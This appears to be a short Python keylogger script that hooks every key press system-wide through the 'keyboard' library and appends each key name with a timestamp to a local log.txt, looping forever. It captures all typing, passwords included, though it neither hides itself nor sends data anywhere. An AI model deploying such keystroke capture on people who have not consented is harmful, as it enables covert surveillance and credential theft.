import keyboard
from datetime import datetime

def on_key_press(key):
    with open('log.txt', 'a+') as f:
        key_name = key.name
        current_time = datetime.now().strftime('%H:%M:%S')
        f.write(f'{current_time} Key {key_name} pressed\n')
        
keyboard.on_press(on_key_press)

while True:
    pass